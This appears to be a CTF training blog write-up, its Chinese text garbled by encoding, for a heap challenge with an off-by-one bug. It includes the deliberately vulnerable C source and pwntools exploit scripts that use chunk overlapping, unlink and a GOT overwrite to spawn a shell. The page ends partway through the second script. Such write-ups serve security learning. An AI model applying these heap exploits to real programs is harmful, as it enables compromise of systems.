<!DOCTYPE html>
<html>
  <head>
      <script>
  var _hmt = _hmt || []
  ;(function() {
    var hm = document.createElement('script')
    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
    var s = document.getElementsByTagName('script')[0]
    s.parentNode.insertBefore(hm, s)
  })()
</script> 
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    
    <title>
      SummerTask - Rin
    </title>
    <link rel="manifest" href="/manifest.json" />
    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
    
<link rel="stylesheet" href="../../../../style/style.css">

  <meta name="generator" content="Hexo 5.4.0"></head>
  <body>
    <canvas id='pagemap'></canvas>
    
    <div id="post-toc" class="animated hiddenToc hide">
      <span class="title">Toc</span>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%EF%BC%89Summer-Havard"><span class="toc-text">1ï¼‰Summer_Havard</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%80%83%E7%82%B9"><span class="toc-text">1) è€ƒç‚¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%EF%BC%89%E6%BA%90%E7%A0%81"><span class="toc-text">2ï¼‰æºç </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%EF%BC%89%E8%A7%A3%E9%A2%98%E5%88%86%E6%9E%90"><span class="toc-text">3ï¼‰è§£é¢˜åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%EF%BC%89%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="toc-text">1ï¼‰æ¼æ´ç‚¹åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-text">2ï¼‰æ¼æ´åˆ©ç”¨åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-level0-baby-overlapping"><span class="toc-text">1)  level0-baby_overlapping</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%89level1-eazy-unlink"><span class="toc-text">2ï¼‰level1-eazy_unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89%E5%A0%86%E9%A3%8E%E6%B0%B4%E6%9E%84%E9%80%A0"><span class="toc-text">1ï¼‰å †é£æ°´æ„é€ </span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%EF%BC%89%E5%88%A9%E7%94%A8off-by-null-%E8%BF%9B%E8%A1%8Cunlink"><span class="toc-text">2ï¼‰åˆ©ç”¨off by null è¿›è¡Œunlink</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%EF%BC%89%E5%AE%8C%E6%95%B4exp%EF%BC%9A"><span class="toc-text">3ï¼‰å®Œæ•´expï¼š</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%EF%BC%89level2-harder-unlink"><span class="toc-text">3ï¼‰level2-harder_unlink</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%80%BB%E7%BB%93"><span class="toc-text">4)æ€»ç»“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%EF%BC%89%E5%86%9B%E8%AE%AD%EF%BC%9F%E8%80%83%E6%A0%B8%EF%BC%9F%E5%A4%A7%E5%86%92%E9%99%A9%EF%BC%81"><span class="toc-text">5ï¼‰å†›è®­ï¼Ÿè€ƒæ ¸ï¼Ÿå¤§å†’é™©ï¼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%EF%BC%89extra%EF%BC%88%E6%85%8E%E9%87%8D%E8%A7%82%E7%9C%8B%EF%BC%89"><span class="toc-text">6ï¼‰extraï¼ˆæ…é‡è§‚çœ‹ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E9%83%A8%E5%88%86"><span class="toc-text">è°ƒè¯•éƒ¨åˆ†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E8%A7%A3%E5%86%B3gdb%E6%97%A0%E6%B3%95%E6%9F%A5%E7%9C%8Bheap%E7%AD%89%E4%BF%A1%E6%81%AF%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">1.1-è§£å†³gdbæ— æ³•æŸ¥çœ‹heapç­‰ä¿¡æ¯çš„é—®é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%89%E9%80%9A%E8%BF%87pwntools%E5%8A%A0%E8%BD%BD%E5%B8%A6%E6%9C%89dbg%E7%AC%A6%E5%8F%B7%E7%9A%84libc"><span class="toc-text">1ï¼‰é€šè¿‡pwntoolsåŠ è½½å¸¦æœ‰dbgç¬¦å·çš„libc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%EF%BC%89%E6%89%8B%E5%8A%A8%E6%9F%A5%E7%9C%8B%E5%A0%86%E5%86%85%E5%AD%98%E4%BF%A1%E6%81%AF"><span class="toc-text">2ï¼‰æ‰‹åŠ¨æŸ¥çœ‹å †å†…å­˜ä¿¡æ¯</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%EF%BC%89%E6%89%8B%E5%8A%A8%E7%BC%96%E8%AF%91degub%E7%89%88%E6%9C%AC%E7%9A%84libc"><span class="toc-text">3ï¼‰æ‰‹åŠ¨ç¼–è¯‘degubç‰ˆæœ¬çš„libc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E8%A7%A3%E5%86%B3libc-so-6%E7%9B%B8%E5%85%B3%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98"><span class="toc-text">1.2-è§£å†³libc.so.6ç›¸å…³æŠ¥é”™é—®é¢˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E5%90%8E%E7%9A%84%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96%E9%97%AE%E9%A2%98%E3%80%82"><span class="toc-text">1.3-é™„åŠ è°ƒè¯•åçš„åœ°å€éšæœºåŒ–é—®é¢˜ã€‚</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">åŸºç¡€çŸ¥è¯†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-Tcache%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-text">2.1-Tcacheçš„å®‰å…¨é—®é¢˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-chunk%E7%9A%84size%E7%9A%84%E5%86%85%E5%AD%98%E5%AF%B9%E9%BD%90%E9%97%AE%E9%A2%98"><span class="toc-text">2.2-chunkçš„sizeçš„å†…å­˜å¯¹é½é—®é¢˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-unlink%EF%BC%9F"><span class="toc-text">2.3-unlinkï¼Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-largebin"><span class="toc-text">2.4-largebin</span></a></li></ol></li></ol></li></ol>
    </div>
    
    <div id="fixed-menu-wrap">
      <span class="iconfont icon-sousuo search-box menu-reset"></span>
      <span class="icon-toc menu-reset">Toc</span>
      <span class="iconfont icon-arrowup menu-reset"></span>
    </div>
    <div id="fixed-menu">
      <span class="iconfont icon-menu-"></span>
    </div>
    <div id="progress">
      <div class="line"></div>
    </div>
    <div id="search-shade" class="animated hiddenSearch hide">
      <div class="input-wrap">
        <span class="iconfont icon-sousuo search-box"></span>
        <input type="text" placeholder="Search" />
        <span class="iconfont icon-close"></span>
      </div>
      <div class="search-result">
        <div class="meta">
          <span><b id="result-count">0</b> results found</span>
          <img src="/images/logo.jpeg" />
        </div>
        <ul id="result-box"></ul>
      </div>
    </div>
    <div id="menu-mask" class="animated hideMenuMask hide">
      <span class="iconfont icon-close"></span>
      <div class="nav">
        
        <a href="../../../../index.html" class="">
          Home
        </a>
        
        <a href="../../../../friends" class="">
          Friends
        </a>
        
        <a href="../../../../about" class="">
          About
        </a>
        
      </div>
    </div>
    <div id="header">
      <div class="intro">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <div class="author"></div>
      </div>
      <div class="nav">
        <span class="iconfont icon-menu menu-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
    </div>
    <div id="side" class="animated bounceInLeft">
      <div class="shrink">
        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        <span class="iconfont icon-menu toggle-icon"></span>
        <a href="#" class="search-box">
          <span class="iconfont icon-sousuo"></span>
        </a>
      </div>
      <div class="magnify">
        <div class="about">
          <div class="author"></div>
          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
        </div>

        <div class="nav">
          
          <a href="../../../../index.html" class="">
            Home
          </a>
          
          <a href="../../../../friends" class="">
            Friends
          </a>
          
          <a href="../../../../about" class="">
            About
          </a>
          
          <a href="#" class="search-box">
            <span class="iconfont icon-sousuo"></span>
          </a>
        </div>
        <div class="bottom">
          <div class="follow">
            
            <a href="https://github.com" target="_block">
              <span class="iconfont icon-github"></span>
            </a>
             
            <a href="/atom.xml" target="_block">
              <span class="iconfont icon-rss"></span>
            </a>
            
          </div>
        </div>
      </div>
    </div>
    <div id="container">
      <div class="main animated bounceInRight delay-0.7s">
        <article class="post-entry">
    <div class="header">
      
      <div class="title">SummerTask</div>
      <div class="meta">
        <span class="item">
          <span class="iconfont icon-time-circle"></span>
          <span>2021/08/02</span>
        </span>

        

        
        
         
          <span class="item">
            <span class="iconfont icon-tag1"></span>
            <span>
                
                  
                    <a href="/tags/Heap">Heap</a>
                  
                
            </span>
          </span>
         
      </div>
      <div>
      </div>
    </div>
    <html><head></head><body><h1 id="1ï¼‰Summer-Havard">1ï¼‰Summer_Havard<a class="post-anchor" href="#1ï¼‰Summer-Havard"></a></h1><h2 id="1-è€ƒç‚¹">1) è€ƒç‚¹<a class="post-anchor" href="#1-è€ƒç‚¹"></a></h2><p>unlink</p>
<p>chunk overlapping</p>
<p>off by one/null</p>
<h2 id="2ï¼‰æºç ">2ï¼‰æºç <a class="post-anchor" href="#2ï¼‰æºç "></a></h2><pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include&lt;sys/stat.h&gt;

#define MAX_IDX 100//the maximum number of songs which can be created
#define MAX_SIZE 9999//the maximum size of your chunk
//#define MAGICAL_IDX rand()%1000 // MAGICAL_IDX is a randow number in range of 0 - 1000.
//#define MAGICAL_IDX 2 // MAGICAL_IDX is a randow number in range of 0 - 1000.

//int MAGIC_NAME =  831;//the name of the target song to getshell

struct song // create the struct of song
{
  char *name; //the name of the song
  size_t size;//the size of the song
};

struct song *songlist[MAX_IDX];//set the max number of the songs

void menu()
{
  puts("|----------------------------|");
  puts("|         MY_PLAYER          |");
  puts("|----------------------------|");
  puts("|1.DOWNLOAD THE SONG         |");
  puts("|2.DELETE THE SONG           |");
  puts("|3.LISTENING                 |");
  puts("|4.EDIT THE NAME OF THE SONG |");
  puts("|5.EXIT                      |");
  puts("|6.PWNED                     |");
  puts("|----------------------------|");
  puts("|            âˆ§ ___ âˆ§         |");
  puts("|           / â—   â— |        |");
  puts("|          /    -   |        |");
  puts("|----------------------------|");
}

void download() //add a new heap includeing a size chunk and content chunk.
{ int i;
  char buf[8];//the buffer of the read func .
  size_t size;//the size of the chunk.
  if (MAX_IDX &gt; 100) //set the range .
  {
    puts(" MEMORY EXCESSIVE LOAD ");
    return;
  }
  for (i = 0; i &lt; MAX_IDX; i++)//init the struct heap.
  {
    if (!songlist[i]) 
    {
      songlist[i] = (struct song *)malloc(sizeof(struct song));
      if (!songlist[i])
       {
        puts("ALLOCA ERROR");
        exit(-1);
       } //error
  
      printf("SIZE OF THE SONG :");
      scanf("%ld",&amp;size);
      if (size &gt; 0 &amp;&amp; size &lt; MAX_SIZE)
      {
        songlist[i]-&gt;name = (char *)malloc(size);//add a chunk to store the struct 'size' .
      if (!songlist[i]-&gt;name) 
      {
        puts("ALLOCA ERROR");
        exit(-1);
      }//error
      printf("NAME :");
      read(0,songlist[i]-&gt;name,size);
      //scanf("%c",&amp;(songlist[i]-&gt;name));
      puts("DOWNLOAD SUCCESFULLY");
      break;
      }
      else
      {
        printf("(INVALID SIZE)\n" );
        break;
      }
      
    }
  }
}

void delete()//delete
{ 
  int idx;
  char buf[4];
  printf("INDEX :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx &lt; 0 || idx &gt;= 100) 
  {
    puts("INVALID INDEX!!!");
    exit(0);
  }
  if (songlist[idx]) 
  {
    free(songlist[idx]-&gt;name);
    free(songlist[idx]);
    puts("DELETE SUCCESFULLY");
  }
  else
    {
      puts("THE SONG DOESN'T EXIST!");
    }
}

void listen()
{ 
  char buf[4];
  int idx;
  printf("INDEX :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx &lt; 0 || idx &gt; 100) 
  {
    puts("INVALID INDEX!!!");
    exit(0);
  }
  if (songlist[idx])
  {
  printf("YOU ARE LINTENING TO %s ",songlist[idx]-&gt;name);
  }  
  else
    {
      puts("THE SONG DOESN'T EXIST!");
    }
}

void edit()
{ 
  char buf[8];
  int idx;
  size_t size;

  puts("NOW YOU CAN CHANGE YOUR SONG'S NAME!!");

  printf("INDEX OF YOUR TERGGER SONG: ");
  scanf("%d",&amp;idx);
  if(idx &lt; 0 || idx &gt; 100)
    {
      puts("INVALID INDEX!!!");
      exit(0);
    }
    printf("SIZE OF THE SONG :");
    read(0, buf, 8);
    size = atoi(buf);
    songlist[idx]-&gt;name = (char *)malloc(size);//add a chunk to store the struct 'size' .
    if (!songlist[idx]-&gt;name) 
    {
        puts("ALLOCA ERROR");
        exit(-1);
    }//error
    if (songlist[idx]) 
    {
    puts("CHANGE YOUR SONG NAME NOW :");
    read(0,songlist[idx]-&gt;name,size+1);
    puts("EDIT SUCCESFULLY"); 
    } 
    else
      {
        puts("THE SONG DOESN'T EXIST!");
      }
}
int main()
{ int i = 0;
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  char buf[4];
  while (1)
  {
    menu();
    puts("YOUR CHOISE :");
    read(0, buf, 4);
    //scanf("%d",&amp;i);
    switch (atoi(buf))
    {
    case 1:
      download();
      sleep(1);
      break;
    case 2:
      delete();
      sleep(1);
      break;
    case 3:
      listen();
      sleep(1);
      break;
    case 4:
      edit();
      sleep(1);
      break;
    case 5:
      exit(0);
      sleep(1);
      break;
    case 6:
      for(i;i&lt;20;i++)
      {
        printf("?????\n");
        sleep(1);
      }
      break;
    default:
      puts("INVALID CHOISE!!!");
      break;
    }
  }
  return 0;
}
</code></pre>
<h2 id="3ï¼‰è§£é¢˜åˆ†æ">3ï¼‰è§£é¢˜åˆ†æ<a class="post-anchor" href="#3ï¼‰è§£é¢˜åˆ†æ"></a></h2><h3 id="1ï¼‰æ¼æ´ç‚¹åˆ†æ">1ï¼‰æ¼æ´ç‚¹åˆ†æ<a class="post-anchor" href="#1ï¼‰æ¼æ´ç‚¹åˆ†æ"></a></h3><pre><code class="bash">rin@fur1n:~/pwn$ checksec summer
[*] '/home/rin/pwn/summer'
    Arch:     amd64-64-little
    RELRO:    NO RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      NO PIE 
</code></pre>
<p>æ— pieï¼Œæ— relro</p>
<pre><code class="c">printf("NAME :");
      read(0, **((void ***)&amp;songlist + i), size + 1);
      puts("DOWNLOAD SUCCESFULLY");
</code></pre>
<p>ä¸€ä¸ªå¾ˆç›´è§‚çš„æ¼æ´ç‚¹ï¼Œreadçš„æ—¶å€™ä¼šæ¯”åŸæœ¬è§„å®šçš„å¤šè¯»å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œé€ æˆoff by oneã€‚</p>
<h3 id="2ï¼‰æ¼æ´åˆ©ç”¨åˆ†æ">2ï¼‰æ¼æ´åˆ©ç”¨åˆ†æ<a class="post-anchor" href="#2ï¼‰æ¼æ´åˆ©ç”¨åˆ†æ"></a></h3><p>è¿™ç§å †é¢˜ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æ€è·¯å°±æ˜¯æ‚¬å‚æŒ‡é’ˆçš„åˆ©ç”¨ã€‚åˆ©ç”¨fake chunkæ¥ä¿®æ”¹æŒ‡é’ˆé€ æˆä»»æ„åœ°å€å†™ã€‚ä½†ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨2.26åçš„å¯¹äºprev_sizeçš„æ£€æµ‹ä¸ºæ— è„‘chunk overlappingå¢åŠ äº†éš¾åº¦ã€‚æ‰€ä»¥è¿™é‡Œåˆ†åˆ«å°†ç¨‹åºä»¥libc2.23å’Œlibc2.27ï¼Œ2.29æ‰§è¡Œï¼Œå¹¶ä¸”åˆ†åˆ«åˆ†æå¯¹åº”çš„æ¼æ´åˆ©ç”¨ã€‚</p>
<h4 id="1-level0-baby-overlapping">1)  level0-baby_overlapping<a class="post-anchor" href="#1-level0-baby-overlapping"></a></h4><p>æ—¢ç„¶æ˜¯å•å­—èŠ‚æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä¿®æ”¹chunk çš„<code>prev_size</code>ä½åï¼Œæ§åˆ¶è¿™ä¸ªchunkçš„æŒ‡é’ˆï¼Œå°†å®ƒåŠ«æŒåˆ°freeæˆ–è€…showçš„gotè¡¨åœ°å€ç„¶åleak libcåŸºå€ã€‚</p>
<p>æ ¸å¿ƒåˆ©ç”¨æ€è·¯ä¸ctf wikiå…³äºchunk overlappingä¸Šé¢çš„ç¤ºä¾‹5ä¸€æ ·ã€‚</p>
<p>ç”³è¯·ä¸¤ä¸ªchunkï¼Œç„¶åç¼–è¾‘chunk0ï¼Œåˆ©ç”¨off by oneè¦†ç›–chunk1çš„<code>prev_size</code>ä½ï¼Œç„¶åé‡Šæ”¾chunk1ï¼Œç”±äºæ‚¬å‚æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°addä¸€ä¸ª0x40å¤§å°çš„chunk1ï¼Œç”¨freeçš„gotè¡¨çš„åœ°å€è¦†ç›–æŒ‡å‘chunk1çš„æŒ‡é’ˆï¼Œå†åˆ©ç”¨<code>showï¼ˆ1ï¼‰</code>åŠŸèƒ½æ‰“å°å°†å®ƒå‡ºæ¥ï¼Œè¿™å°±å®Œæˆäº†å†…å­˜æ³„éœ²ã€‚</p>
<p>ç„¶ååˆ©ç”¨freeçš„çœŸå®åœ°å€è¿›è€Œè®¡ç®—å‡ºsystemçš„çœŸå®åœ°å€ï¼Œç»§è€Œåœ¨freeçš„gotçš„ä½ç½®å°†freeçš„gotè¡¨å€¼è¦†ç›–ä¸ºsystemçš„åœ°å€ï¼Œé€šè¿‡ä¹‹å‰æ„é€ çš„chunk1çš„contentä¸­çš„<code>"/bin/sh"</code>è¿›è¡Œç³»ç»Ÿè°ƒç”¨å¹¶getshellã€‚</p>
<p>expå¦‚ä¸‹ã€‚å…·ä½“çš„ç»†èŠ‚è¯´æ˜åœ¨æ³¨é‡Šä¸­ã€‚</p>
<pre><code class="python">from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
r = process(["./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so", "./summer_1"],env={"LD_PRELOAD":"./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6"})#switch the verion of libc
context.log_level = 'debug'
libc = ELF('./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so')
elf  = ELF('./summer_1')


def add(size,content):
  r.sendline("1")
  r.sendafter(":",str(size))
  r.sendafter(":",content)

def delete(idx):
  r.sendline("2")
  r.sendafter(":",str(idx))

def show(idx):
  r.sendline("3")
  r.sendafter(":",str(idx))

def edit(idx,content):
  r.sendline("4")
  r.sendafter(":",str(idx))
  r.sendafter(":",str(content))

def dbg():
  gdb.attach(r)
  pause()

free_got = 0x4036E8 

add(0x18, b"aaaa")  # chunk0
add(0x10, b"bbbb")  # chunk1
edit(0, b"/bin/sh\x00" + b"a" * 0x10 + b"\x41")
#construct thestruction of chunk0 for the application later.
#Especially the str('/bin/sh')to trigger the system execve()
#dbg()

delete(1)#free chunk1,then the 41 will become the size of chunk1
add(0x20, p64(0) * 4 + p64(0x20) + p64(elf.got['free'])) 
#overlap the chunk1
show(1) 

free_addr = u64(r.recvuntil("DOWNLOAD SUCCESFULLY")[:-5].ljust(8, "\x00"))
libc_base = free_addr - libc.symbols['free']
print(hex(libc_base))
system_addr = libc_base + libc.symbols['system']
#leak

edit(1, p64(system_addr))

show(1)
delete(0)

r.interactive()
</code></pre>
<h4 id="2ï¼‰level1-eazy-unlink">2ï¼‰level1-eazy_unlink<a class="post-anchor" href="#2ï¼‰level1-eazy-unlink"></a></h4><p>è™½ç„¶ç›´æ¥ä¿®æ”¹prevsizeä½é€ æˆå †å éå¸¸ç®€å•ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ©ç”¨unlinkä¸­çš„æ€è·¯ï¼Œåœ¨chunkä¸­æ„é€ fakechunkï¼Œé€šè¿‡off by one/null è§¦å‘unlinké€ æˆå †å ã€‚è¿™å¹¶ä¸æ˜¯ç‰¹åœ°ç»•è¿œè·¯ï¼Œåœ¨level2ä¸­æˆ‘ä»¬æ— æ³•ç›´æ¥å•å­—èŠ‚æº¢å‡ºï¼Œå¿…é¡»ç”¨åˆ°ulninkã€‚</p>
<p>é‚£ä¸ºä»€ä¹ˆåˆ©ç”¨unlinkèƒ½æ„é€ å †å å‘¢ï¼Ÿ<strong>è¯¦è§extraã€‚</strong></p>
<p>æ„é€ å‡ºå †å ä»¥åçš„åˆ©ç”¨å°±ç›¸å¯¹æ¨¡ç‰ˆåŒ–ï¼Œå› ä¸ºä¿æŠ¤åŒæ ·è¿˜æ˜¯åªæœ‰nxå’Œcanaryï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°åŒæ— ä¿æŠ¤çš„å †å ä¸€æ ·ä¿®æ”¹chunkçš„æŒ‡é’ˆä¸º<code>free</code>çš„gotè¡¨åœ°å€æ¥æ³„éœ²ç¨‹åºçš„å†…å­˜å¸ƒå±€ï¼Œç„¶åå†ç”¨systemçš„gotè¡¨å€¼æŠŠ<code>free</code>çš„gotè¡¨å€¼è¦†ç›–ã€‚</p>
<p>å…·ä½“çš„ç»†èŠ‚åˆ†æå¦‚ä¸‹ã€‚</p>
<h5 id="1ï¼‰å †é£æ°´æ„é€ ">1ï¼‰å †é£æ°´æ„é€ <a class="post-anchor" href="#1ï¼‰å †é£æ°´æ„é€ "></a></h5><p><del>psï¼šç¨‹åºä¼šå…ˆåˆ†é…ä¸€ä¸ª0x20çš„chunkå‚¨å­˜sizeã€‚ä½†æ˜¯æ•ˆæœæ˜¯ä¸€æ ·çš„</del></p>
<pre><code class="python">add(0xf8,b'aaaa')#chunk0ï¼Œç”¨æ¥å†™systemçš„å‚æ•°
add(0xf8,b'bbbb')#chunk1#åœ¨å…¶ä¸­ä¼ªé€ fake chunk
add(0xf8,b'cccc')#chunk2#è§¦å‘unlink
add(0xf8,b'dddd')#chunk3,ç”¨æ¥é˜²æ­¢free chunk ä¸ top chunk åˆå¹¶
</code></pre>
<p>è¿ç»­ç”³è¯·4ä¸ªchunkï¼Œå¤§å°éƒ½æ˜¯0xf8ã€‚</p>
<p>0xf8è¿™ä¸ªæ•°å­—çš„æ¥æºå¦‚ä½•ï¼Ÿ</p>
<p>åˆ†é…0xf8çš„contentï¼Œå®é™…åœ¨å†…å­˜ä¸­æ˜¯0x101ã€‚ ä¸ºä»€ä¹ˆæ˜¯0x101ï¼Ÿ é¦–å…ˆæˆ‘ä»¬è¦å®ç°ç©ºå­—èŠ‚æº¢å‡ºï¼Œä¸€èˆ¬æ¥è¯´æ˜¯æº¢å‡ºä¸€ä¸ª<code>/x00</code>ã€‚å¦‚æœchunkçš„sizeè¿‡å°ï¼Œå…ˆä¸è¯´freeä»¥ååˆ†é…çš„chunkçš„ç§ç±»ï¼Œå•æ˜¯ç©ºå­—èŠ‚æº¢å‡ºä¹Ÿä¼šä½¿å¾—sizeå˜æˆ0ï¼Œè¿™é‡Œåªæœ‰å½“åŸæœ¬çš„sizeæ˜¯ä¸‰ä½æ•°çš„æ—¶å€™æº¢å‡ºæ‰æœ‰æ„ä¹‰ã€‚ å…¶æ¬¡è¿˜æ¶‰åŠåˆ°prec sizeçš„åœ¨å†…å­˜çš„ä½ç½®é—®é¢˜ã€‚</p>
<p><strong>è¯¦ç»†åˆ†æå‚è§exrtaã€‚</strong></p>
<h5 id="2ï¼‰åˆ©ç”¨off-by-null-è¿›è¡Œunlink">2ï¼‰åˆ©ç”¨off by null è¿›è¡Œunlink<a class="post-anchor" href="#2ï¼‰åˆ©ç”¨off-by-null-è¿›è¡Œunlink"></a></h5><pre><code class="python">payload = p64(0x110)#prev_size
payload += p64(0xf1)#size
payload += p64(next_chunk_addr - 0x18)#fd
payload += p64(next_chunk_addr - 0x10)#bk
payload += b'a'*0xd0#å †çš„å¤§å°å‡å»ä¼ªé€ çš„heapå¤´ï¼Œ0x100-0x8*5
payload += p64(0xf0)#next_prev_sizeï¼Œåˆ©ç”¨äº†off by nullçš„å•å­—èŠ‚æº¢å‡º
edit(1,payload)
delete(2)#è§¦å‘unlinkã€ï¼Œé€ æˆå †å 
</code></pre>
<p>è¿™é‡Œå¼€å§‹è¿›è¡Œunlinkæ“ä½œã€‚</p>
<p>é¦–å…ˆç¡®å®šfdï¼Œbkåœ°å€ã€‚ç¡®å®šåœ°å€çš„æ€è·¯äº‹å®ä¸Šå°±æ˜¯ä¹‹å‰æåˆ°è¿‡çš„ï¼Œextraéƒ¨åˆ†ä¸­å¯¹äºunlinkåˆ©ç”¨çš„æ¦‚è¿°ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯next_chunk_addr - 0x18/0x10ã€‚</p>
<p>Nextchunk addrçš„åœ°å€åˆ™æ˜¯chunk2 ptrã€‚å¯ä»¥é€šè¿‡è°ƒè¯•å¾—åˆ°å…·ä½“çš„å€¼å³0x6024b0</p>
<p>å¹¶ä¸”æˆ‘ä»¬é€šè¿‡ç©ºå­—èŠ‚æº¢å‡ºä½¿å¾—next chunkçš„prev sizeä½ä¸ºF0ï¼Œå®ƒå°†prev inuseæ”¹æˆäº†00ï¼Œä½¿å¾—ç¨‹åºè®¤ä¸ºchunk1æ˜¯ä¸€ä¸ªfree chunkï¼Œå½“æˆ‘ä»¬é‡Šæ”¾chunk2ï¼Œå°±ä¼šè§¦å‘chunk1çš„unlinkã€‚</p>
<p>è€Œä¸”æ ¹æ®unlinkçš„åŸç†ï¼Œè¿™æ®µexpä½¿å¾—è¿™ä¸ªfake chunkçš„åœ°å€å‘ä¸‹å‡å°‘äº†0x18.(ps:64bitä¸‹ï¼‰</p>
<p>æ„å‘³ç€chunk1å·²ç»å’Œchunk2å½¢æˆäº†å †å ã€‚</p>
<p><strong>å…·ä½“è¿˜æ˜¯å‚è§extra</strong></p>
<p>å †å çš„å½¢æˆæ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹chunk1çš„å†…å®¹æ”¹å˜å®ƒçš„æŒ‡é’ˆã€‚</p>
<pre><code>payload1 = p64(0xf8)#size
payload1 = p64(free_got_addr)#åˆ©ç”¨å †å æ›´æ”¹chunk1çš„æŒ‡é’ˆ
edit(1,payload1ï¼‰
showï¼ˆ1ï¼‰#æ­¤æ—¶æ‰“å°å‡ºchunk1çš„å†…å®¹ï¼Œå³ä¸ºfreeçš„çœŸå®åœ°å€
</code></pre>
<h5 id="3ï¼‰å®Œæ•´expï¼š">3ï¼‰å®Œæ•´expï¼š<a class="post-anchor" href="#3ï¼‰å®Œæ•´expï¼š"></a></h5><pre><code class="python">
from pwn import *


context.terminal = ["tmux", "splitw", "-h"]
r = process(["./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so", "./summer_1"],env={"LD_PRELOAD":"./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6"})#switch the verion of libc
context.log_level = 'debug'
libc = ELF('./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so')
elf  = ELF('./summer_1')



def add(size,content):
  r.recvuntil(":")
  r.sendline("1")
  r.sendlineafter(":",str(size))
  r.sendlineafter(":",content)


def delete(idx):
  r.recvuntil(":")
  r.sendline("2")
  r.sendlineafter(":",str(idx))

def show(idx):
  r.recvuntil(":")
  r.sendline("3")
  r.sendlineafter(":",str(idx))

def edit(idx,content):
  r.recvuntil(":")
  r.sendline("4")
  r.sendlineafter(":",str(idx))
  r.sendlineafter(":",str(content))

def dbg():
  gdb.attach(r)
  pause()

unlink_addr = 0x6024b0
free_got_addr = 0x4036E8
next_chunk_addr = unlink_addr

add(0xf8,b'aaaa')#chunk0ï¼Œç”¨æ¥å†™systemçš„å‚æ•°
add(0xf8,b'bbbb')#chunk1#åœ¨å…¶ä¸­ä¼ªé€ fake chunk
add(0xf8,b'cccc')#chunk2#è§¦å‘unlink
add(0xf8,b'dddd')#chunk3,ç”¨æ¥é˜²æ­¢free chunk ä¸ top chunk åˆå¹¶


